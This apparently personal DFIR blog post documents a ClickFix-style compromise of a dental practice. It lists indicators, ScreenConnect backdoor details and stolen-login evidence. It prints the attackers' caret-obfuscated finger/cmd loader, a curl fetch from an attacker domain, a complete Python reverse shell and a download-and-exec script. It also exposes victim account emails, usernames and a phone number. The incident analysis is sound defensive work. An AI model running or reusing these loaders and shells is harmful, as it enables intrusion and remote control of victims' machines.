---

title: A Forensic Investigation on Finger
date: 2026-04-19
tags:
 - DFIR
 - Blog

---

---


### **The "Turlock Dental" Attack Chain (IoC Documentation)**

#### **I. Delivery & Initial Access (The "Lure")**

The attack started when the user visited a malicious ad-tech or hijacked domain, likely looking for a legitimate login.

- **Suspected Entry URL:** `thelinkesisthebest.it.com` (followed by heavy GCLID/GAD parameters).
- **Initial Compromise Timestamp:** `2026-04-15 16:24:07.423 UTC`
- **Encoded Logic:** The payload used an encoded domain `dERK8Ko+SPll3fI4ktOXyGETlPtRvoHIttvQhh3OR68=` to hide the next hop.

#### **II. Execution (The "Living off the Land" Phase)**

The user was tricked into running a command that used standard Windows utilities to download the second stage.

- **The Command:** `curl -s -L --tlsv1.2 --ssl-no-revoke linked-people.com/leyts.php?Npier=1`
- **The Bypass:** The attacker used `f^i^n^g^e^r` (caret-escaping) to hide the string from EDR/AV monitors.
- **The TTP:** `cmd /K for /f "skip=14 delims=" %h in ('finger ...') do call %h`
    - This is a clever trick: The `finger` protocol is rarely monitored. By skipping the first 14 lines of the response, they bypass "junk" data to execute the hidden 15th line—effectively a **fileless remote shell**.

#### **III. Persistence & C2 (The "Backdoor")**

Once execution was achieved, the attacker deployed a legitimate Remote Monitoring and Management (RMM) tool to maintain access.

- **The Backdoor:** Unauthorized ScreenConnect (ConnectWise) instance.
- **Installation Path:** `C:\Users\Dentrix\AppData\Local\Apps\2.0\...\scre..tion_...`
- **C2 Relays (The Beacons):**
    - `instance-m15qco-relay.screenconnect.com` (`15.204.43.236`)
    - `instance-zayrhg-relay.screenconnect.com` (`139.178.91.96`)
- **Persistence Config:** Found in `user.config`, mapping the host to these specific relay addresses.

#### **IV. Post-Exploitation & Data Theft**

After the backdoor was established, the attacker began accessing browser artifacts to steal sessions and credentials.

- **Artifacts Accessed:** Chrome Cookies and Login Data.

- **Targeted Credentials (Logins found in logs):**
    - **eFax Corporate:** `efaxcorporate.com` (16:40 UTC)
    - **HelloPearl:** `secondopinion.hellopearl.com` (16:52 UTC)
    - **Delta Dental:** `deltadentalins.com` (17:10 UTC)
    - **MyLoop:** `myloop.us` (17:18 UTC)
    - **HealthyStart:** `portal.thehealthystart.com` (17:20 UTC)
- **Lateral Movement Attempt:** A Python script (`modes.py`) was identified attempting to establish a reverse shell to `192.168.1.105:4444`.
    - _Forensic Note:_ Investigated for potential ARP poisoning on the local network.

---

### **Summary of Critical IoCs for Forensic Documentation**

| **Category**    | **Indicator**                                                                      |
| --------------- | ---------------------------------------------------------------------------------- |
| **Domains**     | `linked-people.com`, `dapala.net`, `thelinkesisthebest.it.com`                     |
| **Relay IPs**   | `15.204.43.236`, `139.178.91.96`                                                   |
| **Internal IP** | `192.168.1.105` (Attacker pivot/Internal listener)                                 |
| **Filenames**   | `scr3` (Python payload), `modes.py` (Reverse shell), `user.config` (ScreenConnect) |
| **Procs**       | `Mobsync.exe`, `SearchHost.exe` (Used as parents for malicious threads)            |

































- Curl -s -L --tlsv1.2 --ssl-no-revoke linked-people.com/leyts.php?Npier=1
Parent of Explorer (Start of clickfix)
- Mobsync.exe
- StartmenuExperiencehoost.exe -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca
- SearchHost.exe -ServerName:CortanaUI.AppXstmwaab17q5s3y22tp6apqz7a45vwv65.mca

Cmd Parent of top level
What got flagged 
```bash
cmd /K for /f "skip=14 delims=" %h in ('f^i^n^g^e^r rgWnFMVDZL@f^i^n^g^e^r^.^linked-people.com') do call %h
```
Essentially what this does is talk to that address, opens a remote session where it waits for the endpoint to respond 

Unobfuscated and defanged code is here 

```sh
finger rgWnFMVDZL@finger[.]linked-people[.]com
```


First CMD (Parent of all)
```
cmd /c for /f "skip=14 delims=" %h in ('finger rgWnFMVDZL@finger.linked-people.com') do call %h
```

**What this does:**
- **Connects** to `finger.linked-people.com`.
- **Downloads** a text response.
- **Filters** out the first 14 lines of "junk" text.
- **Executes** every line that follows as a direct command on your system.



Python 2556773726507.exe
```python
import os, socket, subprocess

# The attacker's connection details
ip = "192.168.1.105"
port = 4444

# Creates a connection to the attacker
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

# Redirects your computer's terminal input/output to the attacker
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Launches a command prompt shell for the attacker
p = subprocess.call(["/bin/sh", "-i"])
```

Sub Process of that script 
```python
import ssl
import time
import urllib.request

# 1. Disable Certificate Verification
ssl._create_default_https_context = ssl._create_unverified_context

# 2. Download the Payload
c = urllib.request.urlopen('https://dapala.net/.../scr3').read().decode('utf-8')

# 3. Brief Delay
time.sleep(2.1)

# 4. Execute in Memory
exec(c)
```

CHECK THE ARP -A for 192.168.1.105 possible arp posoining

209 655 9743


Browser artifacts - |   |
|---|
|Encoded domain: dERK8Ko+SPll3fI4ktOXyGETlPtRvoHIttvQhh3OR68=|


|                                                                                                                                                                                                                        |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| https://thelinkesisthebest.it.com/?gad_source=1&gad_campaignid=23737621563&gbraid=0AAAABDDpXAoV6sxGj-LVRSJGKOEalKuF-&gclid=CjwKCAjw7vzOBhBxEiwAc7WNr_ae_GPkxwbuULkhRZ2kHtlbt-0CvyWyXxYovSjUZcYgqwQU2-9umBoCMI8QAvD_BwE |
UTC time of suspected initial compromise (going on linked-people.com)
2026-04-15 16.24.07.423
Cookies were accessed 
Drive was accessed
2026-04-15 16.24.42.937 - go to c.php endpoint on linked-people.com

login efax corporate
|   |   |   |   |   |
|---|---|---|---|---|
|login (username)|2026-04-15 16:40:26.840|https://www.efaxcorporate.com/myaccount/recoverPassword/requestToken||2096674712|

login secondopinion.hellopearl.com 2026-04-15 16.52.43.153

|                  |                         |                                           |                    |                             |
| ---------------- | ----------------------- | ----------------------------------------- | ------------------ | --------------------------- |
| login (username) | 2026-04-15 17:10:50.217 | https://www.deltadentalins.com/ciam/login |                    | tdccarecreators             |
|                  |                         |                                           |                    |                             |
| login (username) | 2026-04-15 17:18:58.419 | https://myloop.us/Account/Login           | Email              | turlockdentalcare@gmail.com |
|                  |                         |                                           |                    |                             |
|                  |                         |                                           |                    |                             |
| login (username) | 2026-04-15 17:20:45.823 | https://portal.thehealthystart.com/login  | portal_login_email | empacificdh@gmail.com       |


Path of screenconnect instance 
"C:\Users\Dentrix\AppData\Local\Apps\2.0\1RHNBQDE.XOT\Y27ONCBX.VQW\scre..tion_8fbb309794d2792f_0019.0004_ca0228f2dd8ee2e9"

connecting to 
15.204.43.236
139.178.91.96

user.config
```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <configSections>
        <section name="ScreenConnect.ApplicationSettings" type="System.Configuration.ClientSettingsSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
    </configSections>
    <ScreenConnect.ApplicationSettings>
        <setting name="HostToAddressMap" serializeAs="String">
            <value>instance-zayrhg-relay.screenconnect.com=139.178.91.96-5%2f20%2f2025%204%3a24%3a03%20PM&amp;instance-m15qco-relay.screenconnect.com=15.204.43.236-4%2f15%2f2026%207%3a19%3a52%20PM</value>
        </setting>
    </ScreenConnect.ApplicationSettings>
</configuration> 
```